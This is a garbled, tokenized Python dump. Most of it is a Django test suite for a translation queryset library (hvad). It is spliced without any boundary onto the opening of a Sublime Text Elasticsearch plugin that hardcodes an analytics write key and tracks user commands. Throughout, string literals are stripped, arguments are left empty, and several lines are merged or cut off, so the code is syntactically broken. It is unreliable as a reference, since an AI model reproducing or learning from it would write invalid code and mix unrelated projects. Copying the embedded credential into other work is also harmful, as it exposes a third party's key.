self . assertEqual ( newja2 . shared_field , ja2 . shared_field ) \n 
self . assertEqual ( newja1 . translated_field , ja1 . translated_field ) \n 
self . assertEqual ( newja2 . translated_field , ja2 . translated_field ) \n 
\n 
~~ def test_update_mixed ( self ) : \n 
~~~ NEW_SHARED = \n 
NEW_TRANSLATED = \n 
ja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
ja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
with self . assertNumQueries ( 2 if connection . features . update_can_self_select else 3 ) : \n 
~~~ Normal . objects . language ( ) . update ( \n 
shared_field = NEW_SHARED , translated_field = NEW_TRANSLATED \n 
) \n 
~~ new1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
new2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( new1 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( new1 . translated_field , NEW_TRANSLATED ) \n 
self . assertEqual ( new2 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( new2 . translated_field , NEW_TRANSLATED ) \n 
newja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
newja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( newja1 . shared_field , NEW_SHARED ) \n 
self . assertEqual ( newja2 . shared_field , NEW_SHARED ) \n 
\n 
self . assertEqual ( newja1 . translated_field , ja1 . translated_field ) \n 
self . assertEqual ( newja2 . translated_field , ja2 . translated_field ) \n 
\n 
~~ def test_update_deferred_language ( self ) : \n 
~~~ NEW_TRANSLATED = \n 
n1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
n2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
ja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
ja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) \n 
~~ with translation . override ( ) : \n 
~~~ with self . assertNumQueries ( 1 ) : \n 
~~~ qs . update ( translated_field = NEW_TRANSLATED ) \n 
~~ ~~ new1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
new2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( new1 . shared_field , n1 . shared_field ) \n 
self . assertEqual ( new2 . shared_field , n2 . shared_field ) \n 
self . assertEqual ( new1 . translated_field , NEW_TRANSLATED ) \n 
self . assertEqual ( new2 . translated_field , NEW_TRANSLATED ) \n 
\n 
newja1 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 1 ] ) \n 
newja2 = Normal . objects . language ( ) . get ( pk = self . normal_id [ 2 ] ) \n 
self . assertEqual ( newja1 . shared_field , ja1 . shared_field ) \n 
self . assertEqual ( newja2 . shared_field , ja2 . shared_field ) \n 
self . assertEqual ( newja1 . translated_field , ja1 . translated_field ) \n 
self . assertEqual ( newja2 . translated_field , ja2 . translated_field ) \n 
\n 
~~ def test_update_fallbacks ( self ) : \n 
# Test it works - note that is it still not recommended as the query is much \n 
# more complicated that it need to be \n 
~~~ qs = Normal . objects . language ( ) . fallbacks ( ) \n 
with self . assertNumQueries ( 1 if connection . features . update_can_self_select else 2 ) : \n 
~~~ qs . filter ( shared_field = NORMAL [ 1 ] . shared_field ) . update ( shared_field = ) \n 
\n 
~~ self . assertEqual ( Normal . objects . language ( ) . get ( shared_field = ) . pk , self . normal_id self . assertEqual ( Normal . objects . language ( ) . get ( shared_field = ) . pk , self . normal_id \n 
\n 
~~ ~~ class ValuesListTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_values_list_translated ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values_list ( , flat = True ) \n 
values_list = list ( values ) \n 
self . assertCountEqual ( values_list , [ NORMAL [ 1 ] . translated_field [ ] , \n 
NORMAL [ 2 ] . translated_field [ ] ] ) \n 
\n 
~~ def test_values_list_shared ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values_list ( , flat = True ) \n 
values_list = list ( values ) \n 
self . assertCountEqual ( values_list , [ NORMAL [ 1 ] . shared_field , \n 
NORMAL [ 2 ] . shared_field ] ) \n 
\n 
~~ def test_values_list_mixed ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values_list ( , ) \n 
values_list = list ( values ) \n 
check = [ \n 
( NORMAL [ 1 ] . shared_field , NORMAL [ 1 ] . translated_field [ ] ) , \n 
( NORMAL [ 2 ] . shared_field , NORMAL [ 2 ] . translated_field [ ] ) , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_list_deferred_language ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) \n 
~~ with translation . override ( ) : \n 
~~~ values = qs . values_list ( , ) \n 
values_list = list ( values ) \n 
~~ check = [ \n 
( NORMAL [ 1 ] . shared_field , NORMAL [ 1 ] . translated_field [ ] ) , \n 
( NORMAL [ 2 ] . shared_field , NORMAL [ 2 ] . translated_field [ ] ) , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_list_language_all ( self ) : \n 
~~~ values = ( Normal . objects . language ( ) . filter ( shared_field = NORMAL [ 1 ] . shared_field ) \n 
. values_list ( , ) ) \n 
values_list = list ( values ) \n 
check = [ \n 
( NORMAL [ 1 ] . shared_field , NORMAL [ 1 ] . translated_field [ ] ) , \n 
( NORMAL [ 1 ] . shared_field , NORMAL [ 1 ] . translated_field [ ] ) , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
\n 
~~ ~~ class ValuesTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_values_shared ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values ( ) \n 
values_list = list ( values ) \n 
check = [ \n 
{ : NORMAL [ 1 ] . shared_field } , \n 
{ : NORMAL [ 2 ] . shared_field } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_translated ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values ( ) \n 
values_list = list ( values ) \n 
check = [ \n 
{ : NORMAL [ 1 ] . translated_field [ ] } , \n 
{ : NORMAL [ 2 ] . translated_field [ ] } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_mixed ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values ( , ) \n 
values_list = list ( values ) \n 
check = [ \n 
{ : NORMAL [ 1 ] . translated_field [ ] , \n 
: NORMAL [ 1 ] . shared_field } , \n 
{ : NORMAL [ 2 ] . translated_field [ ] , \n 
: NORMAL [ 2 ] . shared_field } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_post_language ( self ) : \n 
~~~ values = Normal . objects . language ( ) . values ( ) . language ( ) \n 
values_list = list ( values ) \n 
check = [ \n 
{ : NORMAL [ 1 ] . shared_field } , \n 
{ : NORMAL [ 2 ] . shared_field } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_post_filter ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . values ( ) \n 
values = qs . filter ( shared_field = NORMAL [ 1 ] . shared_field ) \n 
values_list = list ( values ) \n 
check = [ \n 
{ : NORMAL [ 1 ] . shared_field } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_deferred_language ( self ) : \n 
~~~ with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) \n 
~~ with translation . override ( ) : \n 
~~~ values = qs . values ( ) \n 
values_list = list ( values ) \n 
~~ check = [ \n 
{ : NORMAL [ 1 ] . translated_field [ ] } , \n 
{ : NORMAL [ 2 ] . translated_field [ ] } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ def test_values_language_all ( self ) : \n 
~~~ values = ( Normal . objects . language ( ) . filter ( shared_field = NORMAL [ 1 ] . shared_field ) \n 
. values ( , ) ) \n 
values_list = list ( values ) \n 
check = [ \n 
{ : NORMAL [ 1 ] . shared_field , \n 
: NORMAL [ 1 ] . translated_field [ ] } , \n 
{ : NORMAL [ 1 ] . shared_field , \n 
: NORMAL [ 1 ] . translated_field [ ] } , \n 
] \n 
self . assertCountEqual ( values_list , check ) \n 
\n 
~~ ~~ class InBulkTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_empty_in_bulk ( self ) : \n 
~~~ with self . assertNumQueries ( 0 ) : \n 
~~~ result = Normal . objects . language ( ) . in_bulk ( [ ] ) \n 
self . assertEqual ( len ( result ) , 0 ) \n 
\n 
~~ ~~ def test_in_bulk ( self ) : \n 
~~~ pk1 , pk2 = self . normal_id [ 1 ] , self . normal_id [ 2 ] \n 
with self . assertNumQueries ( 1 ) : \n 
~~~ result = Normal . objects . language ( ) . in_bulk ( [ pk1 , pk2 ] ) \n 
self . assertCountEqual ( ( pk1 , pk2 ) , result ) \n 
self . assertEqual ( result [ pk1 ] . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( result [ pk1 ] . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( result [ pk1 ] . language_code , ) \n 
self . assertEqual ( result [ pk2 ] . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( result [ pk2 ] . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
self . assertEqual ( result [ pk2 ] . language_code , ) \n 
\n 
~~ ~~ def test_untranslated_in_bulk ( self ) : \n 
~~~ pk1 = self . normal_id [ 1 ] \n 
with translation . override ( ) : \n 
~~~ with self . assertNumQueries ( 2 ) : \n 
~~~ result = Normal . objects . untranslated ( ) . in_bulk ( [ pk1 ] ) \n 
self . assertCountEqual ( ( pk1 , ) , result ) \n 
self . assertEqual ( result [ pk1 ] . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( result [ pk1 ] . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( result [ pk1 ] . language_code , ) \n 
\n 
~~ ~~ ~~ def test_fallbacks_in_bulk ( self ) : \n 
~~~ ( Normal . objects . language ( ) \n 
. filter ( shared_field = NORMAL [ 2 ] . shared_field ) \n 
. delete_translations ( ) ) \n 
with self . assertNumQueries ( 1 ) : \n 
~~~ pk1 , pk2 = self . normal_id [ 1 ] , self . normal_id [ 2 ] \n 
result = Normal . objects . language ( ) . fallbacks ( , ) . in_bulk ( [ pk1 , pk2 ] ) \n 
self . assertCountEqual ( ( pk1 , pk2 ) , result ) \n 
self . assertEqual ( result [ pk1 ] . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( result [ pk1 ] . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( result [ pk1 ] . language_code , ) \n 
self . assertEqual ( result [ pk2 ] . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( result [ pk2 ] . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
self . assertEqual ( result [ pk2 ] . language_code , ) \n 
\n 
~~ ~~ def test_all_languages_in_bulk ( self ) : \n 
~~~ with self . assertRaises ( ValueError ) : \n 
~~~ Normal . objects . language ( ) . in_bulk ( [ self . normal_id [ 1 ] ] ) \n 
\n 
~~ ~~ def test_in_bulk_deferred_language ( self ) : \n 
~~~ pk1 = self . normal_id [ 1 ] \n 
with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) \n 
~~ with translation . override ( ) : \n 
~~~ result = qs . in_bulk ( [ pk1 ] ) \n 
self . assertCountEqual ( ( pk1 , ) , result ) \n 
self . assertEqual ( result [ pk1 ] . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( result [ pk1 ] . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( result [ pk1 ] . language_code , ) \n 
\n 
\n 
~~ ~~ ~~ class DeleteTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
\n 
def test_delete_all ( self ) : \n 
~~~ Normal . objects . all ( ) . delete ( ) \n 
self . assertEqual ( Normal . objects . count ( ) , 0 ) \n 
self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 0 ) \n 
\n 
~~ def test_delete_translation ( self ) : \n 
~~~ self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 4 ) \n 
Normal . objects . language ( ) . delete_translations ( ) \n 
self . assertEqual ( Normal . objects . untranslated ( ) . count ( ) , 2 ) \n 
self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 2 ) \n 
Normal . objects . language ( ) . delete_translations ( ) \n 
self . assertEqual ( Normal . objects . untranslated ( ) . count ( ) , 2 ) \n 
self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 0 ) \n 
\n 
~~ def test_filtered_delete_translation ( self ) : \n 
~~~ self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 4 ) \n 
( Normal . objects . language ( ) \n 
. filter ( shared_field = NORMAL [ 1 ] . shared_field ) \n 
. delete_translations ( ) ) \n 
self . assertEqual ( Normal . objects . untranslated ( ) . count ( ) , 2 ) \n 
self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 3 ) \n 
( Normal . objects . language ( ) \n 
. filter ( translated_field = NORMAL [ 2 ] . translated_field [ ] ) \n 
. delete_translations ( ) ) \n 
self . assertEqual ( Normal . objects . untranslated ( ) . count ( ) , 2 ) \n 
self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 2 ) \n 
\n 
~~ def test_delete_translation_deferred_language ( self ) : \n 
~~~ self . assertEqual ( Normal . _meta . translations_model . objects . count ( ) , 4 ) \n 
with translation . override ( ) : \n 
~~~ qs = Normal . objects . language ( ) \n 
~~ with translation . override ( ) : \n 
~~~ qs . delete_translations ( ) \n 
\n 
~~ self . assertEqual ( Normal . objects . language ( ) . count ( ) , 2 ) \n 
self . assertEqual ( Normal . objects . language ( ) . count ( ) , 0 ) \n 
\n 
~~ def test_delete_fallbacks ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . fallbacks ( ) \n 
qs . filter ( shared_field = NORMAL [ 1 ] . shared_field ) . delete ( ) \n 
\n 
self . assertEqual ( Normal . objects . language ( ) . count ( ) , self . normal_count - 1 ) \n 
self . assertEqual ( Normal . objects . language ( ) . count ( ) , self . normal_count - 1 ) \n 
\n 
\n 
~~ ~~ class GetTranslationFromInstanceTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 1 \n 
\n 
def test_simple ( self ) : \n 
# get the english instance \n 
~~~ en = Normal . objects . language ( ) . get ( ) \n 
\n 
# get the japanese *translations* \n 
ja_trans = en . translations . get_language ( ) \n 
\n 
# get the japanese *combined* \n 
ja = Normal . objects . language ( ) . get ( pk = en . pk ) \n 
\n 
self . assertEqual ( en . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( en . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertRaises ( AttributeError , getattr , ja_trans , ) \n 
self . assertEqual ( ja_trans . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( ja . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( ja . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
\n 
~~ def test_cached ( self ) : \n 
# get the english instance \n 
~~~ en = Normal . objects . untranslated ( ) . prefetch_related ( ) . get ( ) \n 
with self . assertNumQueries ( 0 ) : \n 
~~~ ja_trans = en . translations . get_language ( ) \n 
\n 
# get the japanese *combined* \n 
~~ ja = Normal . objects . language ( ) . get ( pk = en . pk ) \n 
\n 
self . assertEqual ( en . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( en . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertRaises ( AttributeError , getattr , ja_trans , ) \n 
self . assertEqual ( ja_trans . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
self . assertEqual ( ja . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( ja . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
\n 
~~ def test_not_exist ( self ) : \n 
# Without prefetching \n 
~~~ en = Normal . objects . untranslated ( ) . get ( ) \n 
with self . assertRaises ( Normal . DoesNotExist ) : \n 
~~~ en . translations . get_language ( ) \n 
# With prefetching \n 
~~ en = Normal . objects . untranslated ( ) . prefetch_related ( ) . get ( ) \n 
with self . assertRaises ( Normal . DoesNotExist ) : \n 
~~~ en . translations . get_language ( ) \n 
\n 
~~ ~~ ~~ class AggregateTests ( HvadTestCase ) : \n 
~~~ def test_aggregate ( self ) : \n 
~~~ from django . db . models import Avg \n 
\n 
# Initial data \n 
AggregateModel . objects . language ( "en" ) . create ( number = 10 , translated_number = 20 ) \n 
AggregateModel . objects . language ( "en" ) . create ( number = 0 , translated_number = 0 ) \n 
\n 
# Check both the translated and the shared aggregates as arguments \n 
self . assertEqual ( AggregateModel . objects . language ( "en" ) . aggregate ( Avg ( "number" ) ) , { self . assertEqual ( AggregateModel . objects . language ( "en" ) . aggregate ( Avg ( "translated_number" ) ) , \n 
# Check the same calculation, but with keyword arguments \n 
self . assertEqual ( AggregateModel . objects . language ( "en" ) . aggregate ( num = Avg ( "number" ) ) , { : self . assertEqual ( AggregateModel . objects . language ( "en" ) . aggregate ( tnum = Avg ( "translated_number" \n 
~~ ~~ class AnnotateTests ( HvadTestCase , StandardFixture , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
standard_count = 4 \n 
\n 
def test_annotate ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . annotate ( Count ( ) ) \n 
self . assertEqual ( len ( qs ) , self . normal_count ) \n 
self . assertEqual ( qs [ 0 ] . standards__count , 2 ) \n 
self . assertEqual ( qs [ 1 ] . standards__count , 2 ) \n 
\n 
qs = Normal . objects . language ( ) . annotate ( foo = Count ( ) ) \n 
self . assertEqual ( len ( qs ) , self . normal_count ) \n 
self . assertEqual ( qs [ 0 ] . foo , 2 ) \n 
self . assertEqual ( qs [ 1 ] . foo , 2 ) \n 
\n 
with self . assertRaises ( ValueError ) : \n 
~~~ qs = Normal . objects . language ( ) . annotate ( Count ( ) , standards__count = Count ( \n 
~~ ~~ ~~ class NotImplementedTests ( HvadTestCase ) : \n 
~~~ def test_notimplemented ( self ) : \n 
~~~ baseqs = SimpleRelated . objects . language ( ) \n 
\n 
self . assertRaises ( NotImplementedError , baseqs . defer , ) \n 
self . assertRaises ( NotImplementedError , baseqs . only ) \n 
self . assertRaises ( NotImplementedError , baseqs . bulk_create , [ ] ) \n 
# select_related with no field is not implemented \n 
self . assertRaises ( NotImplementedError , baseqs . select_related ) \n 
if django . VERSION >= ( 1 , 7 ) : \n 
~~~ self . assertRaises ( NotImplementedError , baseqs . update_or_create ) \n 
\n 
~~ ~~ ~~ class MinimumVersionTests ( HvadTestCase ) : \n 
~~~ def test_versions ( self ) : \n 
~~~ qs = SimpleRelated . objects . language ( ) \n 
if django . VERSION < ( 1 , 7 ) : \n 
~~~ self . assertRaises ( AttributeError , getattr , qs , ) \n 
\n 
\n 
~~ ~~ ~~ class ExcludeTests ( HvadTestCase , NormalFixture ) : \n 
~~~ normal_count = 1 \n 
\n 
def test_defer ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . exclude ( translated_field = NORMAL [ 1 ] . translated_field [ ] self . assertEqual ( qs . count ( ) , 0 ) \n 
\n 
~~ def test_fallbacks_exclude ( self ) : \n 
~~~ ( Normal . objects . language ( ) \n 
. filter ( shared_field = NORMAL [ 1 ] . shared_field ) \n 
. delete_translations ( ) ) \n 
qs = ( Normal . objects . language ( ) \n 
. fallbacks ( , ) \n 
. exclude ( shared_field = NORMAL [ 1 ] . shared_field ) ) \n 
self . assertEqual ( qs . count ( ) , 0 ) \n 
\n 
~~ def test_all_languages_exclude ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . exclude ( translated_field = NORMAL [ 1 ] . translated_field [ self . assertEqual ( qs . count ( ) , 1 ) \n 
self . assertEqual ( qs [ 0 ] . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
\n 
~~ def test_invalid_all_languages_exclude ( self ) : \n 
~~~ with self . assertRaises ( ValueError ) : \n 
~~~ Normal . objects . language ( ) . exclude ( language_code = ) \n 
\n 
\n 
~~ ~~ ~~ class ComplexFilterTests ( HvadTestCase , StandardFixture , NormalFixture ) : \n 
~~~ normal_count = 2 \n 
standard_count = 2 \n 
\n 
def test_qobject_filter ( self ) : \n 
~~~ shared_contains_one = Q ( shared_field__contains = ) \n 
shared_contains_two = Q ( shared_field__contains = ) \n 
\n 
qs = Normal . objects . language ( ) . filter ( shared_contains_two ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
\n 
qs = ( Normal . objects . language ( ) . filter ( Q ( shared_contains_one | shared_contains_two ) ) \n 
. order_by ( ) ) \n 
self . assertEqual ( qs . count ( ) , 2 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . shared_field , NORMAL [ 1 ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ 1 ] . translated_field [ ] ) \n 
obj = qs [ 1 ] \n 
self . assertEqual ( obj . shared_field , NORMAL [ 2 ] . shared_field ) \n 
self . assertEqual ( obj . translated_field , NORMAL [ 2 ] . translated_field [ ] ) \n 
\n 
~~ def test_aware_qobject_filter ( self ) : \n 
~~~ from hvad . utils import get_translation_aware_manager \n 
manager = get_translation_aware_manager ( Standard ) \n 
\n 
normal_one = Q ( normal_field = STANDARD [ 1 ] . normal_field ) \n 
normal_two = Q ( normal_field = STANDARD [ 2 ] . normal_field ) \n 
shared_one = Q ( normal__shared_field = NORMAL [ STANDARD [ 1 ] . normal ] . shared_field ) \n 
translated_one_en = Q ( normal__translated_field = NORMAL [ STANDARD [ 1 ] . normal ] . translated_field [ translated_two_en = Q ( normal__translated_field = NORMAL [ STANDARD [ 2 ] . normal ] . translated_field [ \n 
# control group test \n 
with translation . override ( ) : \n 
~~~ qs = manager . filter ( shared_one ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . normal_field , STANDARD [ 1 ] . normal_field ) \n 
\n 
# basic Q object test \n 
qs = manager . filter ( translated_one_en ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . normal_field , STANDARD [ 1 ] . normal_field ) \n 
\n 
# test various intersection combinations \n 
# use a spurious Q to test the logic of recursion along the way \n 
qs = manager . filter ( Q ( normal_one & shared_one & translated_one_en ) ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
obj = qs [ 0 ] \n 
self . assertEqual ( obj . normal_field , STANDARD [ 1 ] . normal_field ) \n 
\n 
qs = manager . filter ( Q ( normal_one & translated_two_en ) ) \n 
self . assertEqual ( qs . count ( ) , 0 ) \n 
qs = manager . filter ( Q ( shared_one & translated_two_en ) ) \n 
self . assertEqual ( qs . count ( ) , 0 ) \n 
qs = manager . filter ( Q ( translated_one_en & translated_two_en ) ) \n 
self . assertEqual ( qs . count ( ) , 0 ) \n 
\n 
# test various union combinations \n 
qs = manager . filter ( Q ( normal_one | translated_one_en ) ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
qs = manager . filter ( Q ( shared_one | translated_one_en ) ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
\n 
qs = manager . filter ( Q ( normal_one | translated_two_en ) ) \n 
self . assertEqual ( qs . count ( ) , 2 ) \n 
qs = manager . filter ( Q ( shared_one | translated_two_en ) ) \n 
self . assertEqual ( qs . count ( ) , 2 ) \n 
\n 
qs = manager . filter ( Q ( translated_one_en | translated_two_en ) ) \n 
self . assertEqual ( qs . count ( ) , 2 ) \n 
\n 
# misc more complex combinations \n 
qs = manager . filter ( Q ( normal_one & ( translated_one_en | translated_two_en ) ) ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
qs = manager . filter ( Q ( normal_two & ( translated_one_en | translated_two_en ) ) ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
qs = manager . filter ( shared_one & ~ translated_one_en ) \n 
self . assertEqual ( qs . count ( ) , 0 ) \n 
qs = manager . filter ( shared_one & ~ translated_two_en ) \n 
self . assertEqual ( qs . count ( ) , 1 ) \n 
\n 
~~ ~~ def test_defer ( self ) : \n 
~~~ qs = Normal . objects . language ( ) . complex_filter ( { } ) \n 
self . assertEqual ( qs . count ( ) , self . normal_count ) \n 
self . assertRaises ( NotImplementedError , \n 
Normal . objects . language ( ) . complex_filter , \n 
Q ( shared_field = NORMAL [ 1 ] . shared_field ) ) \n 
~~ ~~ import json \n 
import threading \n 
import sublime \n 
import sublime_plugin \n 
import analytics \n 
import uuid \n 
\n 
from elasticsearch import Elasticsearch \n 
from elasticsearch_connections import CustomHeadersConnection \n 
from abc import ABCMeta , abstractmethod \n 
\n 
from . . panel import IndexListPanel \n 
from . . panel import DocTypeListPanel \n 
from . . panel import SwitchServerListPanel \n 
from . . panel import AnalyzerListPanel \n 
from . . panel import ScriptListPanel \n 
from . . panel import SearchTemplateListPanel \n 
from . . panel import AliasListPanel \n 
from . . panel import IndexTemplateListPanel \n 
from . . panel import WarmerListPanel \n 
from . . panel import FieldListPanel \n 
from . . panel import RepositoryListPanel \n 
from . . panel import SnapshotListPanel \n 
\n 
ANALYTICS_WRITE_KEY = "phc2hsUe48Dfw1iwsYQs2W7HH9jcwrws" \n 
\n 
\n 
def track_command ( user_id , command_name ) : \n 
~~~ analytics . write_key = ANALYTICS_WRITE_KEY \n 
analytics . identify ( user_id ) \n 
analytics . track ( user_id , "Run Command" , { \n 
"category" : "ST3" , \n 
"label" : command_name , \n 
} ) \n 
\n 
\n 
~~ def track_activate ( user_id ) : \n 
~~~ analytics . write_key = ANALYTICS_WRITE_KEY \n 
analytics . identify ( user_id ) \n 
analytics . track ( user_id , "Activate" , { \n 
"category" : "ST3" , \n 
"label" : sublime . platform ( ) , \n 
} ) \n 
\n 
\n 
~~ class Settings ( object ) : \n 
~~~ SETTINGS_FILE = \n 
\n 
def __init__ ( self ) : \n 
~~~ self . settings = sublime . load_settings ( self . SETTINGS_FILE ) \n 
\n 
~~ @ property \n 
def base_url ( self ) : \n 
~~~ base_url = self . settings . get ( "base_url" , "http://localhost:9200" ) \n 
if base_url . endswith ( "/" ) : \n 
~~~ return base_url [ : - 1 ] \n 
~~ return base_url \n 
\n 
~~ @ property \n 
def index ( self ) : \n 
~~~ return self . settings . get ( "index" , "blog-ja" ) \n 
\n 
~~ @ property \n 
def doc_type ( self ) : \n 
~~~ return self . settings . get ( "doc_type" , "posts" ) \n 
\n 
~~ @ property \n 
def scroll_size ( self ) : \n 
~~~ return self . settings . get ( "scroll_size" , "1m" ) \n 
\n 
~~ @ property \n 
def headers ( self ) : \n 
~~~ return self . settings . get ( "headers" , { } ) \n 
\n 
~~ @ property \n 
def servers ( self ) : \n 
~~~ def _normalize_servers ( servers ) : \n 
~~~ items = [ ] \n 
for name , server in servers . items ( ) : \n 
~~~ server [ "name" ] = name \n 
items . append ( server ) \n 
~~ servers = sorted ( items , key = lambda k : k [ "name" ] ) \n 
return servers \n 
\n 
~~ servers = self . settings . get ( "servers" , [ ] ) \n 
if isinstance ( servers , dict ) : \n 
~~~ servers = _normalize_servers ( servers ) \n 
~~ return servers \n 
\n 
~~ @ property \n 
def active_server ( self ) : \n 
~~~ return dict ( \n 
base_url = self . base_url , \n 
index = self . index , \n 
doc_type = self . doc_type , \n 
scroll_size = self . scroll_size , \n 
) \n 
\n 
~~ @ property \n 
def ab_command ( self ) : \n 
~~~ return self . settings . get ( "ab_command" ) \n 
\n 
~~ @ property \n 
def ab_requests ( self ) : \n 
~~~ return str ( self . settings . get ( "ab_requests" ) ) \n 
\n 
~~ @ property \n 
def ab_concurrency ( self ) : \n 
~~~ return str ( self . settings . get ( "ab_concurrency" ) ) \n 
\n 
~~ @ property \n 
def analytics ( self ) : \n 
~~~ return self . settings . get ( "analytics" , True ) \n 
\n 
~~ @ property \n 
def user_id ( self ) : \n 
~~~ return self . settings . get ( "user_id" , None ) \n 
\n 
~~ @ property \n 
def dump_file ( self ) : \n 
~~~ return self . settings . get ( "dump_file" , "" ) \n 
\n 
~~ @ property \n 
def chunk_size ( self ) : \n 
~~~ return self . settings . get ( "chunk_size" , 500 ) \n 
\n 
~~ def set ( self , key , value ) : \n 
~~~ self . settings . set ( key , value ) \n 
\n 
~~ def save ( self ) : \n 
~~~ sublime . save_settings ( self . SETTINGS_FILE ) \n 
\n 
\n 
~~ ~~ class BaseCommand ( sublime_plugin . WindowCommand ) : \n 
~~~ __metaclass__ = ABCMeta \n 
command_name = None \n 
\n 
def __init__ ( self , * args , ** kwargs ) : \n 
~~~ self . settings = Settings ( ) \n 
sublime_plugin . WindowCommand . __init__ ( self , * args , ** kwargs ) \n 
\n 
~~ @ property \n 
def view ( self ) : \n 
~~~ return self . window . active_view ( ) \n 
\n 
~~ def is_valid_json ( self ) : \n 
~~~ try : \n 
~~~ json . loads ( self . get_text ( ) ) \n 
~~ except ValueError : \n 
~~~ return False \n 
~~ return True \n 
\n 
~~ def is_enabled ( self ) : \n 
~~~ return self . is_valid_json ( ) \n 
\n 
~~ def get_text ( self ) : \n 
